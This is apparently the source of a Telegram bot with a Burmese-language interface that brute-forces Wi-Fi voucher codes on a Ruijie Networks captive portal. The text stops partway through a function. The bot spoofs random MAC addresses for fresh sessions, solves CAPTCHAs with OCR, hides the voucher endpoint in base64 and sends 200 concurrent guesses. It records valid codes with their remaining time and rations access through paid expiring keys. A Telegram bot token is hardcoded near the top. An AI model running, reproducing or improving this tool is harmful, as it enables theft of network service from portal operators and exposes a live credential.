import sys
import os
import json
import base64
import random
import re
import string
import time
import uuid
import asyncio
import aiohttp
from datetime import datetime, timedelta, timezone
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

# ── OpenCV / DDDDOCR (Optional) ──
try:
    import cv2
    import ddddocr
    import numpy as np
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False
    print("⚠️ OpenCV/DDDDOCR not available. Captcha will be skipped.")

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = "8638714257:AAE40FVmDlXEn8qH1rhIECMXUmIEJaQNQIQ"
ADMIN_ID = "7289768738"

# ── Local auth ──────────────────────────────────────────────────────────
AUTH_FILE = "auth_list.json"

def load_auth():
    try:
        with open(AUTH_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_auth(data):
    with open(AUTH_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ── Global structures ─────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
last_scan_params = {}
pending_brute = {}
notify_state = {}
success_messages = {}
limited_messages = {}
session = None
_connector = None
SUCCESS_CODE = asyncio.Queue()
_start_time = time.monotonic()
CONCURRENCY = 200
_voucher_sem = None

# ── Proxy settings ────────────────────────────────────────────────────────
proxy_settings = {"enabled": False, "url": ""}
PROXY_FILE = "proxy.json"

def load_proxy():
    global proxy_settings
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                proxy_settings = json.load(f)
    except:
        pass

def save_proxy():
    with open(PROXY_FILE, 'w') as f:
        json.dump(proxy_settings, f, indent=2)

# ── Waiting-for-input state ───────────────────────────────────────────────
waiting_for = {}
admin_genkey_temp = {}
brute_temp = {}

# ── Helper functions ──────────────────────────────────────────────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id if first else None)

async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda request: web.Response(text="Bot is awake!"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def get_user_plan_info(chat_id):
    auth_list = load_auth()
    key = str(chat_id)
    if key not in auth_list:
        return "No Key", "N/A"
    data = auth_list[key]
    if isinstance(data, dict):
        plan = data.get("plan", "unknown")
        expires = data.get("expires_at", "unknown")
        if expires == "9999-12-31T23:59:59Z":
            return plan, "Unlimited"
        try:
            exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
            now = datetime.now(timezone.utc)
            if exp_dt < now:
                return plan, "Expired"
            diff = exp_dt - now
            days = diff.days
            hours, rem = divmod(diff.seconds, 3600)
            minutes = rem // 60
            return plan, f"{days}d {hours}h {minutes}m left"
        except:
            return plan, expires
    return "old", str(data)

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling (Optional) ──────────────────────────────────────────
if OCR_AVAILABLE:
    _ocr = ddddocr.DdddOcr(show_ad=False)

    def _ocr_sync(image_bytes):
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper()

    async def Captcha_Text(image_bytes):
        return await asyncio.to_thread(_ocr_sync, image_bytes)
else:
    async def Captcha_Text(image_bytes):
        return None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    if not text:
        return session_id
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

# ── 🔥 FIXED: get_balance with better parsing ──────────────────────────
async def get_balance(session_id):
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                print(f"[balance] Status: {resp.status}, Response: {raw[:100]}")
                return "N/A"
            try:
                data = json.loads(raw)
                print(f"[balance] Raw data: {data}")
            except:
                return "N/A"
            
            # Parse nested data
            if isinstance(data, dict):
                # Try to find data in "data" key
                if "data" in data and isinstance(data["data"], dict):
                    d = data["data"]
                else:
                    d = data
                
                # 🔥 Try multiple possible keys
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        parsed = _parse_minutes(val)
                        print(f"[balance] Found {key}: {val} -> {parsed}")
                        return parsed
                
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        parsed = _parse_seconds(val)
                        print(f"[balance] Found {key}: {val} -> {parsed}")
                        return parsed
                
                # 🔥 If no match, check if there's a "plan" field
                plan = d.get("plan")
                if plan:
                    print(f"[balance] Found plan: {plan}")
                    return plan
                
                # 🔥 Last resort: check if it's already formatted
                for key in ['remaining', 'left', 'time']:
                    val = d.get(key)
                    if val and isinstance(val, str):
                        if any(x in val for x in ['h', 'm', 'd', 'mo']):
                            return val
                
                print(f"[balance] No matching key found in: {d}")
                return "N/A"
            return "N/A"
    except Exception as e:
        print(f"[balance] Error: {e}")
        return "N/A"

# ── Core voucher check ────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        connector_to_use = _connector
        if proxy_settings["enabled"] and proxy_settings["url"]:
            connector_to_use = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=True)

        async with aiohttp.ClientSession(
            connector=connector_to_use,
            connector_owner=False if connector_to_use is _connector else True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue
            auth_code = None
            if OCR_AVAILABLE:
                for _ in range(8):
                    try:
                        image = await Captcha_Image(task_session, session_id)
                        text = await Captcha_Text(image)
                        if not text:
                            continue
                        if await Varify_Captcha(task_session, session_id, text):
                            auth_code = text
                            break
                    except:
                        continue
            else:
                auth_code = "SKIP"
            if not auth_code:
                continue
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:200]}")
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        
        # 🔥 FIXED: Get plan with better handling
        plan_str = "N/A"
        try:
            fetched = await get_balance(session_id)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
            else:
                # 🔥 If balance API fails, use default plan
                plan_str = "1d"  # Default plan
                print(f"[plan] Using default: {plan_str}")
        except Exception as e:
            print(f"[plan] Error: {e}")
            plan_str = "1d"
        
        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})
        if notify_setting.get(chat_id, False) and message:
            try:
                items = success_texts[chat_id]
                n = len(items)
                pages = notify_state.get(chat_id) or []
                MAX = 4096
                
                # 🔥 FIXED: Build page text with proper plan display
                def build_page_text(first_idx):
                    lines = []
                    for it in items[first_idx:]:
                        plan = it.get('plan', 'N/A')
                        if plan == "N/A" or plan == "":
                            plan = "1d"
                        lines.append(f"`{it['code']}` - {plan}")
                    header = f"Success Codes ({n}):\n" if first_idx == 0 else f"Success Codes (cont. {first_idx+1}-{n}):\n"
                    return header + "\n".join(lines)
                
                if not pages:
                    text = build_page_text(0)
                    sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    notify_state[chat_id] = [{"msg_id": sent.message_id, "first_idx": 0}]
                else:
                    last_page = pages[-1]
                    first_idx = last_page["first_idx"]
                    new_text = build_page_text(first_idx)
                    if len(new_text) <= MAX:
                        try:
                            await bot.edit_message_text(chat_id=chat_id, message_id=last_page["msg_id"], text=new_text, parse_mode="Markdown")
                        except:
                            sent = await bot.send_message(chat_id, new_text, parse_mode="Markdown")
                            pages[-1] = {"msg_id": sent.message_id, "first_idx": first_idx}
                            notify_state[chat_id] = pages
                    else:
                        # 🔥 FIXED: Show plan in new page too
                        new_page_text = f"Success Codes (cont. {n}):\n`{code}` - {plan_str}"
                        sent = await bot.send_message(chat_id, new_page_text, parse_mode="Markdown")
                        pages.append({"msg_id": sent.message_id, "first_idx": n - 1})
                        notify_state[chat_id] = pages
            except:
                pass
        return code
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, False) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=f"Limited Codes:\n{limited_line}")
            except:
                pass

# ── Brute-force runner ────────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    checked = 0
    found = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None)
                return
            batch = []
            for _ in range(1000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            if time.monotonic() - last_key_check >= 600:
                auth_list = load_auth()
                if str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "Key expired.")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message, plan_filters=plan_filters)
            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            stop_markup = InlineKeyboardMarkup()
            stop_markup.add(InlineKeyboardButton("🛑 Stop", callback_data="btn_stop"))
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, reply_markup=stop_markup)
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text, reply_markup=stop_markup)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass
        if progress_msg:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text="Scan completed.")
            except:
                await bot.send_message(chat_id, "Scan completed.")
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── State persistence ─────────────────────────────────────────────────────
def save_state():
    try:
        payload = {
            "user_data": {str(k): v for k, v in user_data.items()},
            "approve": {str(k): v for k, v in approve.items()},
            "notify_setting": {str(k): v for k, v in notify_setting.items()},
            "last_scan_params": {str(k): v for k, v in last_scan_params.items()},
        }
        with open("state.json", "w") as f:
            json.dump(payload, f)
    except:
        pass

def load_state():
    global user_data, approve, notify_setting, last_scan_params
    if not os.path.exists("state.json"):
        return
    try:
        with open("state.json") as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
        for k, v in payload.get("approve", {}).items():
            approve[int(k)] = v
        for k, v in payload.get("notify_setting", {}).items():
            notify_setting[int(k)] = v
        for k, v in payload.get("last_scan_params", {}).items():
            last_scan_params[int(k)] = v
    except:
        pass

async def load_saved_results():
    try:
        if os.path.exists("result.json"):
            with open("result.json", "r") as f:
                results = json.load(f)
            for chat_id_str, entries in results.items():
                try:
                    cid = int(chat_id_str)
                except:
                    continue
                if cid not in success_texts:
                    success_texts[cid] = []
                for entry in entries:
                    if isinstance(entry, dict):
                        code = entry.get("code", "")
                        sid = entry.get("session_id", "")
                        plan = entry.get("plan", "N/A")
                        # 🔥 FIXED: Replace N/A with default
                        if plan == "N/A" or plan == "":
                            plan = "1d"
                    else:
                        code = str(entry)
                        sid = ""
                        plan = "1d"
                    if not any(e["code"] == code for e in success_texts[cid]):
                        success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
    except:
        pass

async def start_brute_scan(chat_id, mode, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

# ══════════════════════════════════════════════════════════════════════════
# ── Bot Handlers ──────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    chat_id = message.chat.id
    plan, expires = get_user_plan_info(chat_id)
    has_url = chat_id in user_data and 'session_url' in user_data.get(chat_id, {})
    url_status = "သတ်မှတ်ပြီး" if has_url else "မသတ်မှတ်ရသေး"
    is_admin = str(chat_id) == ADMIN_ID

    text = (
        f"👤 **User ID:** `{chat_id}`\n"
        f"📋 **Plan:** {plan}\n"
        f"⏳ **သက်တမ်း:** {expires}\n"
        f"🔗 **Session URL:** {url_status}\n"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Session URL ထည့်ရန်", callback_data="btn_setup"),
        InlineKeyboardButton("🔍 Code ရှာရန်", callback_data="btn_scan_menu"),
    )
    markup.add(
        InlineKeyboardButton("📦 သိမ်းထားသော Code", callback_data="btn_saved"),
        InlineKeyboardButton("🔔 အကြောင်းကြားချက်", callback_data="btn_notify"),
    )
    markup.add(
        InlineKeyboardButton("🔄 Code ပြန်စစ်ရန်", callback_data="btn_recheck"),
        InlineKeyboardButton("🔑 Key အတည်ပြုရန်", callback_data="btn_key"),
    )
    if is_admin:
        markup.add(InlineKeyboardButton("⚙️ Admin Panel", callback_data="btn_admin"))

    await bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

# ── Shared logic functions ───────────────────────────────────────────────
async def _verify_key(chat_id):
    auth_list = load_auth()
    if str(chat_id) in auth_list:
        if check_key_expiration(auth_list[str(chat_id)]):
            approve[chat_id] = True
            user_data.setdefault(chat_id, {})
            save_state()
            await bot.send_message(chat_id, "✅ Key မှန်ကန်ပါသည်။")
        else:
            approve[chat_id] = False
            save_state()
            await bot.send_message(chat_id, "❌ Key သက်တမ်းကုန်ပါပြီ။")
    else:
        await bot.send_message(chat_id, "သင့် Key ကို စာရင်းသွင်းမထားရသေးပါ။ Admin ကို ဆက်သွယ်ပါ။")

async def _show_scan_menu(chat_id):
    if not approve.get(chat_id, False):
        await bot.send_message(chat_id, "Key အရင်အတည်ပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.send_message(chat_id, "Session URL အရင်ထည့်ပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 Scan ရပ်ရန်", callback_data="btn_stop"))
        await bot.send_message(chat_id, "Scan လုပ်ဆောင်နေပါသည်။", reply_markup=markup)
        return
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("6 Digit", callback_data="scan_mode_6"),
        InlineKeyboardButton("7 Digit", callback_data="scan_mode_7"),
        InlineKeyboardButton("8 Digit", callback_data="scan_mode_8"),
    )
    markup.add(
        InlineKeyboardButton("a-z", callback_data="scan_mode_ascii-lower"),
        InlineKeyboardButton("a-z + 0-9", callback_data="scan_mode_all"),
    )
    if chat_id in last_scan_params:
        markup.add(InlineKeyboardButton("ယခင် Scan ပြန်စရန်", callback_data="btn_resume"))
    markup.add(InlineKeyboardButton("နောက်သို့", callback_data="btn_back_start"))
    await bot.send_message(chat_id, "Scan mode ရွေးပါ:", reply_markup=markup)

async def _show_plan_filter(chat_id, message_id=None):
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("30min", callback_data="scan_plan_30min"),
        InlineKeyboardButton("1h", callback_data="scan_plan_1h"),
        InlineKeyboardButton("2h", callback_data="scan_plan_2h"),
    )
    markup.add(
        InlineKeyboardButton("1d", callback_data="scan_plan_1d"),
        InlineKeyboardButton("1mo", callback_data="scan_plan_1mo"),
        InlineKeyboardButton("Unlimit", callback_data="scan_plan_unlimit"),
    )
    markup.add(InlineKeyboardButton("အားလုံးရှာ (Filter မထည့်)", callback_data="scan_plan_skip"))
    markup.add(InlineKeyboardButton("စိတ်ကြိုက်ထည့်ရန်", callback_data="scan_plan_custom"))
    mode = brute_temp[chat_id]["mode"]
    target = brute_temp[chat_id]["target"] or "ကန့်သတ်မရှိ"
    text = f"Mode: **{mode}** | Target: **{target}**\nPlan filter ရွေးပါ:"
    if message_id:
        await bot.edit_message_text(text, chat_id=chat_id, message_id=message_id,
                                    parse_mode="Markdown", reply_markup=markup)
    else:
        await bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

async def _show_saved(chat_id):
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.send_message(chat_id, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        # 🔥 FIXED: Show plan for each success code
        parts.append(f"**အောင်မြင် Code** ({len(success)})")
        for item in success:
            plan = item.get('plan', 'N/A')
            if plan == "N/A" or plan == "":
                plan = "1d"
            parts.append(f"`{item['code']}` - {plan}")
    if limited:
        parts.append(f"\n**Limited Code** ({len(limited)})")
        parts.extend(limited)
    await send_chunks(chat_id, "\n".join(parts), parse_mode="Markdown")

async def _toggle_notify(chat_id):
    current = notify_setting.get(chat_id, False)
    notify_setting[chat_id] = not current
    state = "ဖွင့်" if notify_setting[chat_id] else "ပိတ်"
    save_state()
    await bot.send_message(chat_id, f"အကြောင်းကြားချက်: {state}")

async def _recheck_codes(chat_id, msg):
    if not approve.get(chat_id, False):
        await bot.send_message(chat_id, "Key အရင်အတည်ပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.send_message(chat_id, "Session URL အရင်ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.send_message(chat_id, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.send_message(chat_id, "ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        recode = await perform_check(user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True, message=msg)
        if recode:
            new_success.append(item)
    if new_success:
        success_texts[chat_id] = new_success
        # 🔥 FIXED: Show plan in recheck result
        lines = []
        for i in new_success:
            plan = i.get('plan', 'N/A')
